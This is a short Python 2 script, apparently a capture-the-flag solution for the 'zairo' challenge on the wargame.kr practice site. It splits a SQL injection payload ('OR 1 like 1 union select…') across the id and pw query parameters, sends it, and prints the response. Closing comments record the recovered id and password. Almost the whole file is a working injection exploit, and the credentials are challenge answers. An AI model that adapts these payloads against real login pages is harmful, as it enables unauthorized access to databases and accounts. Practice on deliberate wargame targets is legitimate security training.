# -*- coding: utf8 -*-

import urllib, urllib2, time

headers = {'Host': 'wargame.kr:8080'}

data = "?id="
data = data + urllib.quote("' OR 1 like 1 union select 1,2,")
data = data + "&pw="
data = data + urllib.quote(",4,5#")

req = urllib2.Request("http://wargame.kr:8080/zairo/" + data, '', headers)
response = urllib2.urlopen(req)

res = response.read()
print len(res), res

# pw : wkdlfhpw!!@%%#@@#
# id : zairowkdlfhdkel